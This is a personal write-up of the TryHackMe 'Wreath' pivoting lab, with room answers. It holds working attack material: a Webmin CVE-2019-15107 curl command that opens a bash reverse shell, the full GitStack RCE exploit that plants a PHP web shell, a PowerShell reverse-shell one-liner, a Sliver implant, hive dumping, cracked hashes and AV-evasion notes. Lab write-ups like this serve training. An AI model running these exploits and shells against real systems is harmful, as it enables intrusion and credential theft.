# Wreath Writeup

![](mugshot.png)

Name: Wreath
Date:  
Difficulty:  
Goals:  
- Solidify Pivoting skills
- PWK HERE WE GO!
- AV confidence not Scarecrow and Sliver for the sake of ease
Learnt:
- Masscan does miss - Check on the naabu / rustscan alternative question again 
- Flexing changing it up and feeling good while flexing changing up on the fly!
- Making python virtual environments is just that easy
- Thomas Wreath is as haunting as Alh4zr3d described.
- Serious Noob-Persistent-Thunk-Defined-Routes wins!
- Exploit with DOS line endings?
```bash
dos2unix $file
`sed -i 's/\r//'`
```
- CentOS has a restrictive firewall

Beyond Root:
- Do the report like a professional
- Prep reporting for further Offsec certs 2023!
- Better  proxychains portscanning or more stealthier / elegant ways  to postscan internal networks. 
- BestInSlot CS for myself for copy and paste

- [[Wreath-Notes.md]]
- [[Wreath-CMD-by-CMDs.md]]
- [[Wreath-Penetration-Test-Report]]

![](Wreath-map.excalidraw.md)

## Introduction

#### Lab Scope

`toolname-username` - Shared network naming conventions

#### Brief

*There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.*
## Webserver Enumeration

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

Masscan missed the top 10000 plus port once on 300 rate and on 100 rate... I miss read that 

nikto - found redirect https://thomaswreath.thm

![](10000vuln.png)

![](renmapscananotherport.png)

Nuclei find open redirect to a weird domain... 
`[open-redirect] [http] [medium] http://10.200.96.200/.evil.com [redirect=".evil.com"]`

Mr Wreath is backdoored - this should not resolve
![](backdooredman.png)

`mx.evil.com`  is mail server DNS recond also found by Nuclei the `thomaswreath.thm.evil.com`

[[CVE-2018-11784-http___10.200.96.200__interact.sh]]

![](stillcantfindthatplus15kport.png)

![](poorladisfromyorkshire.png)

#### Task 5 Webserver Enumeration

How many of the first 15000 ports are open on the target?
```
5
```
What OS does Nmap think is running?
```
centos
```

What site does the server try to redirect you to?
```
https://thomaswreath.thm
```

What is Thomas' mobile phone number?

![](verydoxable.png)

```
+447821548812
```

What server version does Nmap detect as running here?
```
MiniServ 1.890 (Webmin httpd)
```

What is the CVE number for this exploit?
```
CVE-2019-15107
```

## Webserver Exploitation

I am prepared doing this machine and do not need to learn Empire or Chisel (just revising chisel) and will use Silver instead.

```go
generate beacon --mtls 10.50.76.121:2222 --arch amd64 --os linux --save /home/kali/Wreath/
mtls -L 10.50.76.121  -l 2222

// In Directory pack to reduce file size
upx WIDE-EYED_TRAM

```


[Exploit DB for Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)](https://www.exploit-db.com/exploits/47230), because OSCP's one Metasploit usage on one machine   

![](foxsincodeexplained.png)

So we do need to worry about python virtual environments for compatibility
```bash
curl  -k https://10.200.96.200:10000/password_change.cgi -d 'user=gotroot&pam=&expired=2|echo ""; bash -i >& /dev/tcp/10.50.76.121/10000 0>&1' -H 'Referer: https://10.200.96.200:10000/session_login.cgi'
```

[Muirland also has provided an exploit to use](https://github.com/MuirlandOracle/CVE-2019-15107) - a better way to do this would be to create a virtual environment
```bash
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107 
python3 -m venv .venv
source .venv/bin/activate
pip3 install .
python3 CVE-2019-15107.py $IP
```

#### Answers to the next section...

#### Task 6 Webserver Exploitation

Which user was the server running as?
```
root
```

What is the root user's password hash?
```
$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1
```

What is the full path to this file?
```
/root/.ssh/id_rsa
```
#### Task 8 Pivoting High-level Overview

Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?  
```
Tunneling
```

**Research:** Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?
```
portfwd
```

#### Task 9 Pivoting Enumeration

What is the absolute path to the file containing DNS entries on Linux?  
```
/etc/resolv.conf
```

What is the absolute path to the hosts file on Windows?  
```
C:\Windows\System32\drivers\etc\hosts
```

How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
```
for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
```

#### Task 10 Pivoting Proxychains & Foxyproxy

What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?  
```
socks4 127.0.0.1 4242
```

What command would you use to telnet through a proxy to 172.16.0.100:23?  
```
proxychains telnet 172.16.0.100 23
```

You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
```
FP
```
#### Task 11 Pivoting SSH Tunnelling / Port Forwarding

If you're connecting to an SSH server _from_ your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?  
```
L
```
Which switch combination can be used to background an SSH port forward or tunnel?  
```
-fN
```

It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay? ```
```
Nay
```


What command would you use to create a pair of throwaway SSH keys for a reverse connection?  
```
ssh-keygen
```


If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")  
```
ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN
```

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?  
```
ssh -D 8000 user@target.thm -fN
```

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
```
ssh -R 8000:127.0.0.1:80 user@172.16.0.50 -fN 
```

#### Task 12 Pivoting plink.exe

What tool can be used to convert OpenSSH keys into PuTTY style keys?
```
puttygen
```

#### Task 13 Pivoting Socat

Which socat option allows you to reuse the same listening port for more than one connection?  
```
reuseaddr
```

If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?  Use TCP port 8000 for the server listener, and **do not** background the process.  
```
./socat tcp-l:8000 tcp:172.16.0.200:443
```

What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
```
./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &
```
#### Task 14 Pivoting Chisel

What command would you use to start a chisel server for a reverse connection on your attacking machine? Use port 4242 for the listener and **do not** background the process.  
```
./chisel server -p 4242 -reverse
```

What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?

```
./chisel client 172.16.0.200R:4242:socks
```

How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.  
```
./chisel client 172.16.0.200:1337  R:33060 :172.16.0.100:3306 & 
```

If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
```
./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
```
#### Task 15 Pivoting sshuttle

How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16  
```
sshuttle pwned@172.16.20.7 172.16.0.0/16
```

What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?  
```
--ssh-cmd "ssh -i priv_key"
```

You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error. What switch (and argument) could you use to fix this error?
```
-x 172.16.0.100
```

## On to the Git Server
I decided to prep my  Sliver and pivoting with chisel
```bash
generate beacon --http 10.50.85.217:2222 --arch amd64 --os linux --save /home/kali/Wreath/
http -L 10.50.85.217 -l 2222

curl http://10.50.85.217/chisel -o chisel
curl http://10.50.85.217/SILVER -o systemCtl


sudo ./chisel server -hosts 10.50.85.217 --reverse -socks 10000
nohup ./chisel client 10.50.85.217:10000 R:10001:socks &
# modify /etc/proxychains4.conf socks5 127.0.0.1 10001
```

While doing the internal network recon I downloaded the /etc/shadow file with `silver`, but none of the hashes cracked with `rockyou.txt`
![](usefulshadowcapturing.png)

Instead of dropping `nmap` on the system we could also be more elegant
```bash
cat /proc/net/arp
arp -a 


# If we knew this was a containerised network - kubernetes or docker or just linux then:
for i in $(seq 1 254); do (ping -c 1 10.200.84.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done

# Port scanning with bash to find open ports on .100,.150 hosts
for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/10.200.84.100/$port && echo "open - $port") 2> /dev/null; done

for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/10.200.84.150/$port && echo "open - $port") 2> /dev/null; done

# Adapted
for port in $(seq 1 15000); do (echo Hello > /dev/tcp/10.200.84.150/$port && echo "open - $port") 2> /dev/null; done
```

Finding the weird port - I did actual then have to drop `nmap` and Beyond Root is now updated to tackle this issue.

Because the big *clue* of either spending a long time proxychaining nmap through chisel to find machines on this subnet we could just check IPv4 resolution on the network:
![](arpaonprodserv.png)

The only machines that have MAC addresses are the Gateway, VPN Server and .100,.150 machines

#### Task 17 Git Server Enumeration

Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?  
```
2
```

In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
```
100,150
```


Scan the hosts -- which one does _not_ return a status of "filtered" for every port (submit the last octet only)?  
```
150
```

Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?  
```

```

Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
```
http
```

#### Task 18 Git Server Pivoting

What is the name of the program running the service?
```
gitstack
```

Do these default credentials work (Aye/Nay)?
```
Nay
```

There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?
```
43777
```

#### Task 19 Git Server Code Review

![](gitstacksearchsploit.png)

Exploit with DOS line endings?
```bash
dos2unix $file
`sed -i 's/\r//'`
```

Look at the information at the top of the script. On what date was this exploit written?
```
18.01.2018
```

Bearing this in mind, is the script written in Python2 or Python3?
```
Python2
```

What is the _name_ of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?
```
csrftoken
```
#### Task 20 Git Server Exploitation

Modified Exploit code:
```python
#!/usr/bin/python2
# Exploit: GitStack 2.3.10 Unauthenticated Remote Code Execution
# Date: 18.01.2018
# Software Link: https://gitstack.com/
# Exploit Author: Kacper Szurek
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# Category: remote
#
#1. Description
#
#$_SERVER['PHP_AUTH_PW'] is directly passed to exec function.
#
#https://security.szurek.pl/gitstack-2310-unauthenticated-rce.html
#
#2. Proof of Concept
#
import requests
from requests.auth import HTTPBasicAuth
import os
import sys

ip = '127.0.0.1:10002'

# What command you want to execute
command = "whoami"

repository = 'rce'
username = 'rce'
password = 'rce'
csrf_token = 'token'

user_list = []

print "[+] Get user list"
try:
        r = requests.get("http://{}/rest/user/".format(ip))
        user_list = r.json()
        user_list.remove('everyone')
except:
        pass

if len(user_list) > 0:
        username = user_list[0]
        print "[+] Found user {}".format(username)
else:
        r = requests.post("http://{}/rest/user/".format(ip), data={'username' : username, 'password' : password})
        print "[+] Create user"

        if not "User created" in r.text and not "User already exist" in r.text:
                print "[-] Cannot create user"
                os._exit(0)

r = requests.get("http://{}/rest/settings/general/webinterface/".format(ip))
if "true" in r.text:
        print "[+] Web repository already enabled"
else:
        print "[+] Enable web repository"
        r = requests.put("http://{}/rest/settings/general/webinterface/".format(ip), data='{"enabled" : "true"}')
        if not "Web interface successfully enabled" in r.text:
                print "[-] Cannot enable web interface"
                os._exit(0)

print "[+] Get repositories list"
r = requests.get("http://{}/rest/repository/".format(ip))
repository_list = r.json()

if len(repository_list) > 0:
        repository = repository_list[0]['name']
        print "[+] Found repository {}".format(repository)
else:
        print "[+] Create repository"

        r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
        if not "The repository has been successfully created" in r.text and not "Repository already exist" in r.text:
                print "[-] Cannot create repository"
                os._exit(0)

print "[+] Add user to repository"
r = requests.post("http://{}/rest/repository/{}/user/{}/".format(ip, repository, username))

if not "added to" in r.text and not "has already" in r.text:
        print "[-] Cannot add user to repository"
        os._exit(0)

print "[+] Disable access for anyone"
r = requests.delete("http://{}/rest/repository/{}/user/{}/".format(ip, repository, "everyone"))

if not "everyone removed from rce" in r.text and not "not in list" in r.text:
        print "[-] Cannot remove access for anyone"
        os._exit(0)

print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit-nvm.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit-nvm.php".format(ip), data={'a' : command})
print r.text.encode(sys.stdout.encoding, errors='replace')
```


Proof my chisel proxy is up and hitting the right IP and port
![](curlingthorughthechisel.png)

It is working!!
![](exploitthegitstack.png)

For the answers
![](gitservoclock.png)

more answers...
![](systeminfothroughthetunnel.png)

CentOS has a restrictive always-on wrapper arount  `iptables` called `firewalld` 
```bash
firewall-cmd --zone=public --add-port $PORT/tcp
```

What is the hostname for this target?
```
git-serv
```
What operating system is this target?
```
Windows
```
What user is the server running as?
```
nt authority\system
```

How many make it to the waiting listener?
```
0
```
#### Task 21 Git Server Stabilisation & Post Exploitation

I really wanted to do a more elegant way of compromising the box than just adding a new user. A new user would be great from the perspective of managing multiple users on THM, but not for OPSEC. 

Given the simple solution of just Scarecrowing-non-shitnowge-tme-avnoevado Silver binary that is faux-signed by Microsoft to bypass AV. I also would like to try something else.

I also need to relay back to my Silver Server and another listener for the safety line of multiple shells.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

He then base64, lttle endians it: convert it to UTF-16LE, which the Windows Default encoding, encodes it to base64 then removes the newline .
```bash
iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
```


![](givingintosocatrelayage.png)

While crying about why mimikatz does not work I just copy the SYSTEM and SAM hives and downloaded them out.
![](nomimikatznoworries.png)

```powershell
reg export HKLM\SYSTEM SYSTEM.bak
reg export HKLM\SYSTEM SYSTEM.bak
```

But secretsdump did not work as something was wrong with the data retry! As I did not have the SECURITY hive which did not want to `robocopy` or `reg export` even though I was administrator

![](iloveruby.png)

What is the Administrator password hash?  
```
37db630168e5f82aafa8461e05c6bbd1
```

What is the NTLM password hash for the user "Thomas"?
```
02d90eda8f6b6b06c32d5f207831101f
```

What is Thomas' password?
```
i<3ruby
```
## C2 Choices Diverge...

From this point I will use have already started using Silver instead of PowerShell Empire here are the answers.
#### Task 24 Command and Control Empire: Overview

Can we get an agent back from the git server directly (Aye/Nay)?
```
Nay
```
#### Task 27 Command and Control Empire: Agents

Using the `help` command for guidance: in Empire CLI, how would we run the `whoami` command inside an agent?
```
shell whoami
```
## Return with Sliver

```powershell
foreach ($port in 80,138,139,443,445,3389) { Test-NetConnection -ComputerName 10.200.96.100 -Port $port -InformationLevel 'Detailed' >> output.txt }
```

Scream `Test-NetConnect`...`ion`
![](powertestconmap.png)

From a stealth perspective if we where it is important to note that the .100 and .150 machine do not commute normally, whereas .200 and .100 do.
![](arpaintdoingmuch.png)

Much like my `nohup $cmd &` trick need a trick for background processes while never having to worry about losing the shell

Backgrounding in PowerShell - [the wonders of Start-Job](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/start-job?view=powershell-7.3)
```powershell
start-job { .\chisel.exe client 10.200.96.150:10007 R:10007:127.0.0.10008:socks }
# Control the job with a identification number 
start-job -id $int32
stop-job -id $int32
remove-job -id $int32
```

#### Task 33 Personal PC Enumeration

Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?
```
80,3389
```
#### Task 34 Personal PC Pivoting

For some reason my sliver beacon broke, but it was not Windows Defender as the file had not been quantined


#### Task 35 Personal PC The Wonders of Git

#### Task 36 Personal PC Website Code Analysis

#### Task 37 Personal PC Exploit PoC

## AV Evasion Notes for the Archive and answers for the Write-up

- In-Memory Evasion 
	- Saving to memory and executing from memory
	- Until **A**nti-**M**alware **S**can **I**nterface(AMSI), bypassing with `IEX` executing in-memory was enough
	- AMSI scans scripts as it is loaded into memory	
	- AMSI provides hooks for AV publishers to use
- On-Disk Evasion
	- Saving to disk and executing from Disk

- Fingerprint AV to determine vendor 
	- Some tools with identification capacity:
	- [SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker)
	- [Seatbelt](https://github.com/GhostPack/Seatbelt) 
- Replication 
	- Prevent AV from transmitting data out of the VM
		- Always disable cloud-based protection in AV settings
		- Disconnect the internet 
		- Always snapshot before doing anything else!
	- Discern detection mechanisms - combinations exist beware
		- Understand the compute trade-offs AV makes to be commercial software by...
			- Constrained to a percentage usage of the CPU
			- Requirement for speed
		- Therefore limitations of..
			- Sandboxing on hosts
				- Resource intensive
				- Is not going to re-sandbox new malware so waiting out the sandbox 
				- Sandboxing has its own signatures for MalDevs to fingerprint
			- AV Vendor copy-catting (VirusTotal signatures) 
				- Brittle signatures (changing it is easy to bypass)
				- Same signatures means if it bypass one leading AV vendor it will probably bypass others
			- Signature and Pre-defined Dynamic Detection Rule definition sizes and complexity 
				- Sets of rules for computers to define checks are explicit and can not interpreted with discreet semantic qualities, either more rules or complex rules or few very clever rules. If this problem could be solved with a few clever rules then AV evasion would not exist.   
			- Hashing 
				- Hashing is compute intensive process 
			- Answers quickly and cheaply
				- Waiting out the sandbox
			- Password Protected files.. AV does have the password
		- Mechanisms 
			- Static Detection 
			- Dynamic / Heuristic / Behavioural Detection

[Online php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator)

#### Task 38 AV Evasion Introduction

Which category of evasion covers uploading a file to the storage on the target before executing it?  
```
On-Disk Evasion
```
What does AMSI stand for?  
```
AntiMalware Scan Interface
```
Which category of evasion does AMSI affect?
```
In-Memory Evasion
```

#### Task 39 AV Evasion AV Detection Methods

What other name can be used for Dynamic/Heuristic detection methods?  
```
Behavioural
```
If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?  
```
Static
```
When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?  
```
```
What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?
```
Password
```
#### Task 40 AV Evasion PHP Payload Obfuscation

#### Task 41 AV Evasion Compiling Netcat & Reverse Shell!

#### Task 42 AV Evasion Enumeration

#### Task 43 AV Evasion Privilege Escalation

#### Task 44 Exfiltration Exfiltration Techniques & Post Exploitation

#### Task 45 Conclusion Debrief & Report

